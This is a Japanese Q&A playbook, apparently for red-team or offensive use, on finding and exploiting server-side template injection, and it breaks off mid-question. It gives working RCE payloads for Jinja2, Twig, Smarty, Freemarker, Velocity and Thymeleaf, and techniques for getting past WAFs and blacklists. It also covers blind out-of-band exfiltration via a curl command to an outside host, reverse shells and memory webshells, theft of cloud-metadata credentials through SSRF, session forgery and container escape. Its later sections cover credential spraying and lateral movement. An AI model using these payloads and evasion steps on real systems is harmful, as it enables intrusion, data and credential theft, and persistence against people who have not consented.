# Web · SSTIテンプレートインジェクションの識別と利用

### 数学プローブ:普通の反射/XSS と SSTI を区別する
**Q1**: あるエコーパラメータがこちらの入力をそのまま印刷した。普通の反射点/XSS でなく SSTI かをどう判断する?
**A1**: 急に payload を載せない。数学プローブを打つ。`{{7*7}}`、`${7*7}`、`#{7*7}`、`<%= 7*7 %>`、`{7*7}` を逐一試す。唯一の判定基準は、エコーが `49` に変わるかだ。`{{7*7}}` がそのまま返ればサーバー側評価ではなく、反射/XSS の領分であって SSTI ではない。
**Q2**: 数学プローブは 49 をエコーしないが、ページが 500 を出す。命中か?
**A2**: 強い信号だ。単一の `{{` のような構文破壊 payload を送り、何を吐くかを見る。エラーページはテンプレートエンジンの異常クラス名を漏らしがちだ(Jinja2/Twig/Freemarker でそれぞれ異なる)。異常クラス名がエンジンを直接教える。
**Q3**: パラメータが `{}$%<` を完全にフィルタする。この手始めの道が塞がれた。どう転じる?
**A3**: 直交次元に転じる。第一に、注入位置を替える。SSTI は User-Agent、Referer、X-Forwarded-For、ユーザーのニックネーム/プロフィール、ファイル名などの「二次描画」場面に隠れがちで、主パラメータだけではない。第二に、盲 SSTI に転じる。時間遅延か帯外 DNS で探査し、エコーに依存しない。
**Q4**: SSTI と確認した。第一歩は何をすべきか?
**A4**: 先に RCE に突っ込まない。先に正確にエンジンをフィンガープリントする。エンジンごとに利用チェーン、サンドボックス、迂回がまったく異なる。盲目的に payload を当てれば注入回数を浪費し、WAF を驚かせる。フィンガープリント先行が規律だ。

### SSTI と CSTI の定性判別
**Q1**: `{{7*7}}` が 49 を出したが、AngularJS/Vue のクライアントテンプレート注入を疑う。どう定性する?
**A1**: 決定的な実験。ブラウザの JS を切るか `curl` で裸で取る。裸のレスポンスに 49 があれば → SSTI(サーバーが計算)。ブラウザが JS を実行して初めて 49 が出れば → CSTI(クライアントが計算)。両者の利用は天地の差で、SSTI はサーバー RCE を打ち、CSTI は本質的に XSS だ。
**Q2**: 純 CSTI と確認した。まだ打つ価値がある?
**A2**: ある。ただし目標が変わる。CSTI → フレームワークサンドボックスエスケープ → 任意 JS 実行 → XSS。旧版 AngularJS には成熟した sandbox escape がある。価値は時に CSP を迂回できること(フレームワーク自身が eval する)だが、影響面はクライアントのアカウント乗っ取りで、サーバー RCE を期待しない。
**Q3**: SSTI でも CSTI でもある二重評価の場合は?
**A3**: 優先して SSTI を打つ(サーバーへ直達、重みが高い)。SSTI がサンドボックス/フィルタに塞がれたら、CSTI で XSS を打ってセッション/管理者を取る。同じ注入点の二つの直交出口で、SSTI が死ねば CSTI が予備だ。
**Q4**: 資源を全て SSTI に賭けたが、純 CSTI と確認した。方向が誤りだ。どう損切りする?
**A4**: 即座に XSS 戦術ライブラリに切り替える。CSP 分析、sandbox escape、DOM 収束点。「サーバー RCE」の期待を「アカウント乗っ取り」に降格する。方向の誤りを識別して素早く戦術ライブラリを替えるほうが、誤った方向で硬くぶつかるより専門的だ。

### 構文ファミリーの分診でエンジンを特定する
**Q1**: SSTI を確認し、エンジンをフィンガープリントしたい。最初のプローブは何を打つ?
**A1**: 「構文ファミリー分診プローブ」を打つ。`{{7*7}}` vs `${7*7}` vs `#{7*7}` vs `<%= 7*7 %>` vs `{7*7}`。どれが評価成功するかで一つの構文ファミリーに固定する。`{{}}`→Jinja2/Twig/Nunjucks/Handlebars。`${}`→Freemarker/Velocity/JSP EL/Thymeleaf。`#{}`→一部の Ruby/Thymeleaf。`<%= %>`→ERB/EJS/ASP。`{}`→Smarty。
**Q2**: あるファミリーに落ちた後、具体的なエンジンにどう絞る?
**A2**: エンジン特有のビルトインを打つ。`${}` ファミリーでは Freemarker は `?new()` を認め、Velocity は `#set` を認め、EL は `${pageContext}` を認める。`{{}}` ファミリーは `{{7*'7'}}` で Jinja2/Twig を分ける。自分の固有構文を認めるものがそれだ。
**Q3**: プローブが全て WAF に遮られた(403/429)。フィンガープリント段階で詰まった。どう転じる?
**A3**: 「エラー駆動フィンガープリント」に転じる。不完全な式を送って異常を誘発し、スタックのクラス名/ファイルパス/バージョンから逆算する。通常のの payload より隠密だ。それも駄目なら傍路に転じる。レスポンスヘッダ `X-Powered-By`、Cookie 名(`JSESSIONID`→Java)、フレームワーク特徴、404 の傾向。
**Q4**: レスポンスが統一ゲートウェイに平らにされ、差異信号が一切ない。どうする?
**A4**: 「技術スタックの先験」に戻る。まず受動情報でバックエンド言語を定め、流行度順にその言語の一般的なエンジンを列挙する。Python→Jinja2/Mako。PHP→Twig/Smarty。Java→Freemarker/Velocity/Thymeleaf。Ruby→ERB。Node→Nunjucks/Handlebars/EJS/Pug。順に試し、総当たりしない。
**Q5**: エンジンまでフィンガープリントしたが版が不明だ。利用に影響する?
**A5**: 影響は巨大だ。同じエンジンでも版ごとにサンドボックス強度が大きく異なる(Jinja2 旧版は無サンドボックス、Freemarker には ClassResolver ホワイトリスト)。先に最も厳格な版を仮定してチェーンを設計し、通れば版が旧い証拠で、意外な収穫だ。

### Jinja2 と Twig の精確な分診
**Q1**: `{{}}` ファミリーに落ち、`{{7*7}}` が 49 を出す。Jinja2(Python)と Twig(PHP)をどう区別する?
**A1**: `{{7*'7'}}` を打つ。`7777777`(文字列反復)を得れば Jinja2 を強く指す。エラーか空なら Twig の可能性が高い。これは古典的な分診法だ。
**Q2**: もう一度確認したい。別のプローブは?
**A2**: それぞれ固有のグローバルを試す。Jinja2 には `{{config}}`、`{{request}}`、`{{lipsum}}`、`{{cycler}}`。Twig には `{{_self}}`、`{{dump()}}`、`{{app}}`(Symfony)。どちらの組を認めるかがどちらかだ。
**Q3**: Nunjucks(Node)が Jinja2 に偽装している場合は?構文がほぼ同じだ。
**A3**: Nunjucks の構文は Jinja2 を模すが下層は JS だ。`{{7*'7'}}` で `NaN` か `0`(JS 意味)を得、`7777777` ではない。且つ `{{range}}`/`{{cycler}}` という Python 専有を認めない。JS と定めたら `constructor.constructor` の JS プロトタイプチェーン利用に進む。
**Q4**: 分診プローブがフィルタされた(引用符、`config` などが遮られる)。型を定められない。どう転じる?
**A4**: バックエンド言語の先験に転じる。レスポンスヘッダ、Cookie、エラーページ、フレームワークルートの傾向で言語を判定する。言語が定まればエンジン候補は収束する(PHP はほぼ Twig/Smarty、Python はほぼ Jinja2/Mako)。さらにエラー駆動で側面確認し、遮られる通常のプローブに依存しない。

### Jinja2 が式から RCE へ登る
**Q1**: Jinja2 と確認した。`{{7*7}}` からコマンド実行へ進む。推理の骨格は?
**A1**: 目標はサンドボックス内の任意オブジェクトから Python の危険なビルトインへ登ることだ。古典経路: 任意オブジェクト→`__class__`→`__mro__`/`__bases__` で基底クラス `object` を取る→`__subclasses__()` で全子クラスを列挙→`Popen`/`os.system` を持ちコマンドを実行できるクラスを探す。
**Q2**: 大きな `__subclasses__()` を取った。RCE できるクラスをどう特定する?
**A2**: 絶対にインデックス番号をハードコードしない。インデックスは Python 版とロード済みモジュールで漂い、別環境では必ず爆発する。「名前で特定」する。子クラスを走査してクラス名に `Popen`/`os._wrap_close`/`subprocess` を含むものにマッチし、動的にインデックスを取ってから呼ぶ。payload はこれで移植可能になる。
**Q3**: `__subclasses__` チェーンが長すぎ目立ちすぎる。もっと短いものは?
**A3**: ある。グローバル名前空間の近道を進む。`cycler`/`joiner`/`namespace`/`lipsum`/`request` などのビルトインオブジェクトの `__init__.__globals__` はしばしば `os` か `__builtins__` に直達する。例 `lipsum.__globals__['os']`。短いチェーンは WAF 命中率を下げる。
**Q4**: コマンドは実行したがエコーが吞まれた(出力が見えない)。どうする?
**A4**: ブラインド攻撃に切り替える。帯外(出力を DNS/HTTP に入れて自分のサーバーへ打つ、`curl http://x/$(id|base64)`)、時間側チャネル `sleep`、あるいは直接リバースシェルで HTTP エコーに依存しない。エコーが吞まれても RCE がないわけではない。
**Q5**: RCE が seccomp/サンドボックスで完全に塞がれ、求値能力だけが残った。Jinja2 はまだ何を搾れる?
**A5**: ファイル読取に降格する。`open()` できる子クラスを探して `/etc/passwd`、ソース、設定を読む。あるいは Flask の `config`/`SECRET_KEY` を読む。SECRET_KEY を読めば session を偽造して権限昇格でき、半端な RCE より価値が高いことが多い。

### Jinja2 のブラックリスト文字/キーワード迂回
**Q1**: Jinja2 と確認したが、`__class__`/`__globals__`/`os` がブラックリストでフィルタされ、payload が送れない。どう迂回する?
**A1**: 核心の発想。ブラックリストは「字面」を遮るので、こちらは「実行時に組み立てる」。`request|attr("__cl"+"ass__")` で遮られた属性名を連結する。`["__cla"~"ss__"]` で添字アクセス。十六進/Unicode エスケープ `\x5f\x5f` でアンダースコアを代替する。
**Q2**: `.`(ドット)属性アクセス符まで遮られたら?
**A2**: 属性アクセス構文を替える。Jinja2 は `[]` 添字か `|attr()` フィルタを使う。ドットは構文糖にすぎず、ほぼ常に代替がある。`()` が遮られたらフィルタパイプで呼び出しを代替できる。
**Q3**: `[]`、`_` アンダースコア、引用符が全てフィルタされ、使える文字がほぼない。どうする?
**A3**: パラメータ密輸(汚点運搬)に転じる。`request.args`/`request.values` で別の HTTP パラメータから危険な文字列を持ち込み、テンプレートボディは変数名 `request.args.x` だけを参照する。危険な文字は全て別パラメータにあり、テンプレートボディへの文字フィルタを迂回する。
**Q4**: 文字セット構築も通らない(引用符全禁など)。どこへ転じる?
**A4**: 文字の実行時生成に転じる。`dict(...)|join`、`|first`、数字連結、ビルトインフィルタの組み合わせで遮られた文字を組み立てる。あるいは `chr` 類で数字から文字を生成し、リクエストに機密平文を一切出現させない。「検知の迂回」から「検知の回避」へ格上げする。
**Q5**: これらの迂回を全て試しても遮られる。Jinja2 のこの道が塞がれた。どの次元に転じる?
**A5**: 注入チャネルを転換する。HTTP メソッドを替える、Content-Type、パラメータ位置(body→header→cookie)、パラメータ汚染、大文字小文字難読化。WAF はしばしば一つのチャネルにだけ布陣する。それも駄目ならこの点が難物だと認め、アプリの他の穴に転じる。

### Twig / PHP テンプレートの利用
**Q1**: フィンガープリントで Twig(PHP)と確認した。Python の反射チェーンはない。RCE をどう構築する?
**A1**: Twig の核心の利用面はフィルタのコールバックだ。`filter`、`map`、`sort` はコールバックを渡せる。古典は `{{['id']|filter('system')}}` か `{{['id',0]|sort('system')}}` で、PHP の危険関数(`system`/`exec`/`passthru`)をコールバックとして渡す。
**Q2**: コールバックフィルタが無効化されたか版が非対応だ。どうする?
**A2**: `_self` 環境オブジェクト経路に転じる。旧版 Twig では `_self` が環境を取れ、さらに `registerUndefinedFilterCallback`/`getFilter` で任意の PHP 関数を呼べる。Twig 1.x/2.x/3.x は利用可能面の差が大きく、先に版でチェーンを選ぶ。
**Q3**: Twig でなく Smarty の場合は?
**A3**: Smarty は `{}` 単一括弧を使う。`{$smarty.version}` で版取得を確認する。`{php}...{/php}` は旧版で直接 PHP を走らせる。`{system('id')}` は一部設定で使える。`{Smarty_Internal_Write_File::writeFile(...)}` は静的メソッドチェーンでファイルを書く。`{if}`/`{literal}` も式を担える。
**Q4**: Twig サンドボックスの SecurityPolicy が開いており、ビルトイン関数がほぼ全禁だ。この道が塞がれた。どう転じる?
**A4**: 直交面に転じる。第一に、ユーザーがテンプレートパス/include を制御できるなら、任意ファイル読取/LFI に転じる。第二に、PHP 特性との組み合わせ。ファイル書き込みが足場確保できるなら(ログ/アップロード)PHP コードを書いてから含める。第三に、SSTI は入口にすぎず、SQLi/デシリアライズ/アップロードなど他の穴に替える。
**Q5**: PHP テンプレート RCE 後に `disable_functions` が `system/exec` を全禁した。どうする?
**A5**: disable_functions 迂回の専題に転じる。LD_PRELOAD、FFI(PHP 7.4+)、`imap_open`/`putenv` の組み合わせ、GC-UAF メモリ馬、あるいはコマンド実行に依存しないファイル読み書き+内部ネットワーク pivot に降格する。RCE 制限≠行き止まり。

### Freemarker の利用と防御迂回
**Q1**: フィンガープリントが Freemarker で、`${7*7}` が 49 を出す。RCE をどう進む?
**A1**: 古典的なビルトインのツールクラス `Execute`。`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。あるいは `ObjectConstructor`、`JythonRuntime`。核心は `?new()` でコマンドを実行できるツールクラスをインスタンス化すること。先に `Execute` が最も汎用だ。
**Q2**: `?new()` が `TemplateClassResolver` ホワイトリストに遮られた(新版既定の防御)。塞がれたらどう転じる?
**A3**: 「gadget を替える」に転じる。`SAFER_RESOLVER` 下で `Execute` が禁じられる。このときアプリが自分でテンプレートコンテキストに注入した bean を探す。多くの業務は Spring コンテキスト、DAO、ツールクラスをテンプレート変数に入れる。これらの現成オブジェクトの `.getClass().forName()` 反射チェーンを辿れば依然 RCE できる。「データモデル内の現成オブジェクト」という面に転じる。
**Q3**: Velocity の場合は?プローブとチェーンはどう変わる?
**A3**: Velocity は `#set` ディレクティブを使う。古典は `#set($e="")` と `$e.getClass().forName("java.lang.Runtime")` の反射で `Runtime.exec` を取る。あるいは `ClassTool`/`$field`/`$method` の反射ツールを使う。
**Q4**: Freemarker RCE は成功したが対象の外向き通信が制限され、リバースできない。どうする?
**A4**: 外向き通信しない利用に転じる。Java メモリ馬(Filter/Listener/Servlet/Agent 型)を注入して無ファイル・無外向き通信の持続 webshell を実現する。あるいは SSTI の任意読み書きでアプリディレクトリに jsp/メモリ馬を落とす。あるいはコマンド出力を Web アクセス可能な静的ディレクトリに書いて HTTP で取り戻す。メモリ馬は Java の無外向き通信の標準的な転向だ。

### Thymeleaf のビュー名注入という特殊な面
**Q1**: フィンガープリントが Thymeleaf で、通常のパラメータ注入は求値しない。その注入点はなぜ特殊か?
**A1**: Thymeleaf SSTI は多くが「ビュー名/fragment 式」で起きる。誘発条件: コントローラが返すビュー名が制御可能(`return "user/" + param` など)だと式の前処理求値が誘発される。payload は `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` の形だ。
**Q2**: 式が確かに求値された。標準 payload をどう構築する?
**A2**: SpringEL を進む。`${T(java.lang.Runtime).getRuntime().exec(...)}` か `[[${...}]]` インライン。`T()` 演算子は静的クラスを取る入口で、`ProcessBuilder`/`Runtime` と組み合わせてコマンドを実行する。
**Q3**: `T()` がフィルタか SecurityManager に遮られた。塞がれたらどう転じる?
**A3**: `T()` なしの SpringEL 構築に転じる。`new java.lang.ProcessBuilder(...)`、`''.getClass().forName(...)` で文字列オブジェクトから `Class` へ反射、`#this.getClass()`。それも駄目なら直交面に転じる。Java アプリには同時にデシリアライズ、Spring コンポーネントの穴がありがちで、SSTI の任意読取能力も `application.yml`/class を読んで他のチェーンを補助できる。
**Q4**: どのコントローラが制御可能なビュー名を返すか特定できず、注入点が探しにくい。どうする?
**A4**: ブラックボックス列挙の発想に転じる。文字列を受け付けジャンプ/描画に影響し得る各パラメータに注入を試し、500 か式の副作用を観察する。あるいは部分的なソース/ルートが読めるなら、ユーザー入力を連結する `return` の反パターンを特定する。誘発点を正しく見つけることが payload より重要だ。

### 無エコー盲 SSTI の手始め
**Q1**: パラメータにエコーが全くないが SSTI を疑う。どう始める?
**A1**: エコーを見ることを諦め、副作用を見る。三つの側チャネル。時間(sleep を注入してレスポンスが遅くなるか)、エラー(構文エラーを注入して 500 になるか)、帯外(ネットワークリクエストを送れる式を注入して自分の DNS/HTTP を監視)。まずエラープローブが最も楽だ。正しい式は 200、誤った式は 500。二元差異で盲で求値を測れる。
**Q2**: 時間プローブをどう設計すれば信頼できる?
**A2**: 対照群が要る。`sleep(0)` vs `sleep(10)` を送って比較し、ネットワークジッタを排除する。複数回サンプルして中央値を取る。ブラインドテストで最も忌むのはジッタによる誤判定だ。先にエラープローブでエンジンを固定してからその遅延原語を使う。
**Q3**: 帯外 DNS が受信できず、時間も差異がない。穴がないのか?
**A3**: 必ずしもそうではない。遅延描画かもしれない。SSTI の結果が今回のレスポンスでなく後続ページにある(ユーザー名に注入、描画は管理者バックグラウンドかメールで起きる)。保存型 SSTI の発想に転じる。注入点と描画点が分離しており、そのデータを二次消費する機能を探して観察する。
**Q4**: 盲求値と確認したが完全に無エコー・無外向き通信だ。データをどう取る?
**A4**: 文字ごとのブール盲注入(盲 SQLi のように)。「鍵の第 1 文字が 'a' なら sleep(5)、そうでなければ sleep(0)」を構築し、時間側チャネルで一ビットずつブルートフォースする。遅いが実行可能だ。あるいは先に SSTI で Web 可読パスへファイルを書いて HTTP で引く。無エコー盲を有エコーのファイル読取に変える。
**Q5**: ブラインド攻撃が遅すぎ且つレート制限される。この道が塞がれた。どこへ転じる?
**A5**: 「一度の RCE でブラインド状態を脱する」に転じる。盲でも、コマンドを一条実行できればリバースシェルか webshell を書き、一歩で盲注入の地獄から飛び出す。資源を集中して「一発で魂を入れる」盲 RCE を構築する。ゆっくりブラインド読み取りせず、一度も実行できなければ穴を替えて戻る。

### 保存型 / 二次描画 SSTI
**Q1**: 直接パラメータが全て求値しないが、アプリには「ユーザー資料/ニックネーム/署名」が別の場所に表示される。どう考える?
**A1**: 「データがどこで二度目に描画されるか」を考える。保存型 SSTI は注入点(資料保存)と誘発点(別所表示)が分離する。資料に `{{7*7}}` を埋め、プロフィールページ、管理バックグラウンド、メッセージリストなどそのフィールドを消費する場所で 49 に変わるかを見る。
**Q2**: 誘発点をどう体系的に探す?
**A2**: 帯外プローブを埋める(一意マークの DNS 戻り)、そのデータを消費し得る全機能(表示、エクスポート、通知、審査バックグラウンド)を巡回し、どの機能が戻りを誘発するかで描画点を特定する。ページごとに肉眼で見るより高効率だ。
**Q3**: 描画が管理者バックグラウンドで起き、こちらが届かない。どう利用する?
**A3**: これはむしろ高価値で、管理者を打つ保存型 SSTI/XSS になる。payload を構築して管理者の描画時に実行し、管理者コンテキストのサーバー側求値かクライアントセッションを取る。注入点は低権限、誘発点は高権限というのは横展開権限昇格の古典構造だ。
**Q4**: プローブを埋めてもずっと戻りがない。穴の有無を判断できない。塞がれたらどう転じる?
**A4**: 他の二次描画の担体に転じる。PDF/レポートエクスポート、メール/SMS テンプレート、エラーメッセージの埋め戻し、ログ描画。これらは全て「ユーザーデータがテンプレートエンジンで再処理される」場面だ。担体を替えて再試行し、一つのフィールドだけを見ない。

### SSTI が非典型な位置に隠れる
**Q1**: 通常のパラメータに穴がないが、「カスタムメール/通知テンプレート」をユーザーに編集させる。どう考える?
**A1**: これは SSTI の高頻度地帯で且つ漏れやすい。ユーザーがテンプレートを編集できる=バックエンドが高い確率でエンジンでユーザー入力を描画する。直接テンプレート枠に `{{7*7}}` を置き、「プレビュー/テスト送信/実際の送信」で誘発する。この種の「設計上テンプレート構文を許す」機能はむしろ防御が最も弱い。
**Q2**: PDF/Excel/レポートのエクスポート機能の場合は?
**A2**: サーバー生成のエクスポート物はしばしばテンプレートエンジンを経る。タイトル、備考、ユーザー名などの制御可能なフィールドにプローブを置き、エクスポート物をダウンロードして求値するかを見る。SSRF も重なるかもしれない(wkhtmltopdf のような PDF エンジンが外部資源をロード)。SSTI が測れなければ SSRF/ローカルファイル読取の測りに転じる。
**Q3**: SSTI がエラーメッセージに出る(不正な値を入力し、エラーページが入力をテンプレートに連結)。どう利用する?
**A3**: 典型的な `render_template_string(user_input)` の反パターンだ。誘発はエラー分岐を作ることで、エラー分岐に入り且つ payload を帯びる入力を構築する。この種は往々にして求値能力が完全で、ただ入念な誘発が必要だ。
**Q4**: テンプレートを使っていると確定したが直接注入が求値しない。エスケープか?塞がれたらどう転じる?
**A4**: 「HTML エスケープ」と「不求値」を分ける。HTML エスケープは `<>&` をエンティティにするだけで、`{{}}` の求値には影響しない。`{{7*7}}` が求値しないなら、入力が「テンプレート位」でなく「データ位」に入った(安全な用法)可能性が高い。「テンプレートそのものを制御できる」機能(テンプレート編集)を探し、「データを固定テンプレートに埋める」機能ではない。前者こそ SSTI の宝庫だ。

### WAF ブラックリストの二分特定
**Q1**: payload を送ると即 403 になる。WAF が遮っている。まず何を遮るかをどう把握する?
**A1**: 二分で特定し、全体を推測しない。payload を最小断片に分解して逐一送る。まず `{{`、次に `{{1}}`、次に `{{config}}`、次に `__class__` を含むもの…結局どの token が遮断を誘発するかを見つける。ブラックリストの境界を精確に知って初めて狙って迂回できる。
**Q2**: 遮られるのがあるキーワードだと特定した。次は?
**A2**: その token に狙って迂回手法を選ぶ。属性名なら連結/エンコード、構文符なら等価構文、関数名ならパラメータ密輸運搬。症状に応じる。全迂回を盲試しない(それでは封禁をより速く誘発するだけ)。
**Q3**: WAF が累積スコアで IP を封じる。反復探査で封じられそうだ。どうする?
**A3**: 探査リズムを制御する。頻度を下げる、出口 IP/プロキシプールを替える、各 IP に少量のプローブだけを送る。二分探査を複数の送信元に分散し、単一 IP の速率封禁を避ける。偵察段階の隠密性は利用と同じく重要だ。
**Q4**: 二分の結果、キーワードブラックリストでなく行動/意味検知だとわかった。迂回できない。塞がれたらどこへ転じる?
**A4**: 注入チャネルの次元を転換する。HTTP メソッドを替える、Content-Type(フォーム→JSON→XML→multipart)、パラメータ位置、HTTP パラメータ汚染(同名パラメータ二回、WAF は前を見てバックエンドは後を取る)、チャンク転送エンコード。WAF はしばしば一つのチャネルにだけ布陣する。

### WAF キーワード迂回の手法庫
**Q1**: キーワードブラックリストと確認した。遮られるのは二重アンダースコアの属性名だ。どう迂回する?
**A1**: 3つの定番手。文字列連結(`"__cla"+"ss__"`)、属性アクセスを添字かフィルタに変える(`x["__class__"]`、`x|attr("__class__")`)、エンコード(十六進 `\x5f`、Unicode、エンジンがデコードするエンティティ)。核心: WAF は静的文字列をマッチするので、文字列がテンプレート実行時に初めて形になるようにする。
**Q2**: 遮られるのが `system`/`exec` のような関数名の場合は?
**A2**: 同じく実行時に関数名を連結するか、パラメータ密輸で別パラメータから持ち込むか、等価関数を使う(コマンド実行には複数の入口がある)。機密の関数名を平文でリクエストに出現させない。
**Q3**: WAF がリクエストを正規化した(URL デコード、大文字小文字統一)。単純なエンコードが無効だ。どうする?
**A3**: 「テンプレート内自己デコード」に転じる。エンジン自身の文字構築能力(数字から文字、連結、フィルタチェーン)でサーバー側で機密文字列を生成し、リクエストには無害な数字と演算子だけを置く。WAF が正規化しても悪意が見えない。これは迂回でなく回避だ。
**Q4**: 全エンコード連結が正規化+意味分析に見破られた。塞がれたらどこへ転じる?
**A4**: この WAF が強いと認め、攻撃面を転換する。同アプリの WAF を通らない傍路 API(内部 API、旧版パス、非標ポート)、あるいは完全に異なる脆弱性カテゴリ。この点にカスタム迂回の研究投入に値するかも評価する。ROI が低ければ主戦場の他の穴に転じる。

### SSTI 能力の SSRF / クラウド認証情報への転化
**Q1**: SSTI が求値できるがサンドボックスがコマンド実行を固定した。残価値を搾りたい。まず何を考える?
**A1**: 「求値でまだ何ができるか」を考える。段階的に降格する。RCE→任意ファイル読取→SSRF(サーバーにリクエストを発起させる)→情報漏えい。どの原語がサンドボックスに塞がれていないかを逐段試す。求値≠RCE だけではない。
**Q2**: SSTI をどう SSRF に変える?
**A2**: エンジン内でネットワークリクエストを発起できるオブジェクト/関数(HTTP クライアント、URL ロード、リモート資源 include)を探す。サーバーに任意 URL をリクエストさせられれば、クラウドメタデータサービスを打って一時クラウド認証情報を取り、内部ネットワークを探り、内部ネットワークのみ到達可能な管理 API にアクセスする。SSTI→SSRF→クラウド認証情報 は非常に価値のあるチェーンだ。
**Q3**: クラウドメタデータを打った後、収益をどう最大化する?
**A3**: 一時認証情報を取ったら即座に権限境界を評価する(何の資源を列挙できるか、ストレージ/コンピュートへ横展開できるか)。動作を認可範囲に制御し、核心は SSTI の「点」を「クラウド面」に広げることだ。認証情報は往々にして単機 RCE より一桁価値が高い。
**Q4**: SSRF すらサンドボックスに塞がれ、内部変数を読むだけになった。まだ見込みは?塞がれたらどこへ転じる?
**A4**: 最低限の価値がある。テンプレートコンテキストオブジェクトを読めば session、config(鍵/DB 文字列)、request、ORM モデルを取れることが多い。フレームワーク版、パス、内部ホスト名だけ漏れても、これらは別の脆弱性(デシリアライズ/パストラバーサル)の弾薬だ。「情報で他の穴を養う」ことに転じ、攻撃面リストに戻って複数の穴を連結する。

### 公式サンドボックスの体系的エスケープ
**Q1**: エンジンが公式サンドボックス(Jinja2 Sandboxed / Twig SecurityPolicy / Freemarker SAFER)を開き、通常の RCE が全禁だ。どう体系的にエスケープを探す?
**A1**: サンドボックスの本質は「属性/メソッドのホワイトリスト+危険のブラックリスト」だ。エスケープの発想は、サンドボックスが覆わない「間接参照」を探すこと。dunder/フィルタ/メソッドを逐一探って境界を探し、検査にブラインド領域のあるオブジェクト種別(フォーマット文字列、`__reduce__`、新版の新機能)を探す。
**Q2**: 具体的にどの周辺オブジェクトから始める?
**A2**: 優先してアプリが自発的にコンテキストに入れたオブジェクト(業務 bean、ツールクラス、request/config)を監査する。それらは「エンジンビルトイン」のサンドボックス管轄外で、メソッドチェーンが外へ登れることが多い。次にエンジンの新機能(新フィルタ/構文糖)。サンドボックス規則は機能更新に遅れがちだ。
**Q3**: サンドボックスが隙なくエスケープできない。この点が塞がれた。どこへ転じる?
**A3**: 二つの道。その一、サンドボックス内で読めるコンテキスト変数、情報漏えいはそのまま収集する。エスケープできなくても価値がある。その二、このエンジン+版が難物だと認め、アプリの他の脆弱性入口に転じるか、同アプリのサンドボックスを付けていない他の描画点を探す(大きなアプリは複数箇所で描画し、防御が不一致だ)。
**Q4**: エスケープ失敗の原因が版が新しすぎると疑う。最新 CVE/0day に固執する価値がある?
**A4**: 時間コストを天秤にかける。目標価値が極めて高く且つ版が確認できれば、既知エスケープの研究に投入できる。そうでなければこの点を「N-day/0day が必要な難点」と記録し、ROI のより高い他の経路を優先して通す。レッドチームは研究者ではない。必要でない限り単点で無限に深掘りしない。

### 自研ブラックリストサンドボックスの迂回
**Q1**: サンドボックスがアプリ自研だ(自分でブラックリストを書いてテンプレート入力をフィルタ)。どう打つ?
**A1**: 自研ブラックリストにはほぼ必ず穴がある。優先度は公式サンドボックスへの固執より高い。体系的に迂回する。大文字小文字変換、エンコード、文字連結、等価構文、コメント挿入、正規表現境界(行頭のキーワードだけをマッチするなら改行で迂回)。重点はそれの「思いつかない等価な書き方」を探すこと。
**Q2**: そのルールのブラインド領域をどう素早く見つける?
**A2**: そのフィルタロジックを逆にする(コードが読めるなら)、あるいはブラックボックス二分。大量の変種を構築してどれが放行するかを探る。自研フィルタのよくある欠陥: 一度しかフィルタせず再帰しない(ネスト迂回)、特定の大文字小文字しかマッチしない、数個のキーワードだけブラックリストして等価関数を漏らす。
**Q3**: 自研サンドボックスが確かにかなり塞がれている。塞がれたらどこへ転じる?
**A4**: 「迂回点を前か後へ移す」に転じる。前へ移す: 入力がフィルタに到達する前の他の入口を探す(別パラメータ/API が別検証を通る)。後へ移す: フィルタ後に連結/二次処理がまだあり注入を持ち込むかを見る。それも駄目なら攻撃面を替える。自研防御は往々にしてテンプレートの一箇所しか守らず、他はより緩い。

### SSTI 足場の価値評価と ROI の取捨
**Q1**: SSTI→RCE で shell を取ったが、ルートなしの最小コンテナだとわかった。次の意思決定は?
**A1**: 先に価値を評価してから動く。判断: 内部ネットワークに届くか(ルート/DNS/他 service に接続)?機密ボリュームがマウントされたか(docker.sock/ホストディレクトリ)?環境変数にクラウド/DB 認証情報があるか?いきなり権限昇格をいじらず、まず足場の価値を洗い出す。
**Q2**: 環境変数に認証情報らしきものを見つけた。どう使う?
**A2**: 優先度で検証する。クラウド認証情報→クラウド資源へ横展開できるかを調べる。DB 認証情報→接続してユーザーテーブルを読めるか。動作を認可範囲に制御し、核心は SSTI のこの点を面に広げることだ。
**Q3**: 突破したが、取るに足らない周辺サービスだとわかった。投入を続けるか撤くか?
**A3**: 横展開価値の三問に転じる。核心ネットワークセグメントに接続できるか?何の認証情報を再利用したか(同じパスワードが他所で使えるか)?信頼関係に高価値目標があるか?全て否なら記録して残し、主戦場に戻る。低価値点で過度に消耗しない。レッドチームは ROI を計算する。
**Q4**: SSTI のファイル読取能力しかない(RCE が完全に塞がれた)。どんな高価値目標を取れる?
**A4**: ROI 順に読む。フレームワーク鍵(Flask SECRET_KEY→session 偽造、Rails secret→cookie 偽造)、設定の DB/Redis/クラウドパスワード、ソース(面を広げて新穴を探す)、`/proc/self/environ`、SSH 秘密鍵、履歴コマンド。鍵を読むことは半端な RCE より価値が高いことが多い。

### SSTI 足場の権限昇格と内部ネットワークへの接続
**Q1**: SSTI→RCE で低権限 shell を取った。権限昇格の前にまず何をする?
**A1**: まずローカル情報収集(手動版 linpeas)。カーネル版、SUID、sudo 権限、cron、可書の service ファイル、コンテナフィンガープリント。SSTI は入口にすぎず、権限昇格は独立した専題だ。先に列挙してから武器を選び、exploit を盲試しない。
**Q2**: コンテナとわかり、ホストへエスケープしたい。判定基準は?
**A2**: エスケープ面を調べる。`docker.sock` が読み書きできるか、特権コンテナ(`--privileged`)、危険な capabilities(`CAP_SYS_ADMIN`)、ホストの機密ディレクトリのマウント、共有カーネル脆弱性。逐項照合し、どれが命中するかでどのエスケープチェーンを進むかを決める。
**Q3**: 権限昇格/エスケープがどちらも見込みなしだが、マシンは内部ネットワークにある。SSTI 足場をどう足がかりに変える?
**A3**: 横展開の準備に転じる。プロキシを立てる(メモリ socks/ポートフォワード)、内部ネットワーク情報を収集する(ARP、ルート、hosts、接続記録、内部サービスの認証情報)。低権限 shell も内部ネットワークに通じる限り貴重な足がかりで、権限昇格失敗≠価値なし。
**Q4**: 他の内部ネットワークホストを指す認証情報を収集した。全体の意思決定は?
**A4**: 認証情報再利用+横展開に転じる。まず認証情報がどのホスト/サービスで有効かを検証する(スプレーして頻度制御でロックを防ぐ)、SSTI 足場から目標への最短経路を計画する。SSTI 突破点の歴史的使命は完了し、重心は内部ネットワーク横展開段階に入る。
**Q5**: リバースシェルが頻繁に切れる/ファイアウォールに切られる。足場が不安定だ。どうする?
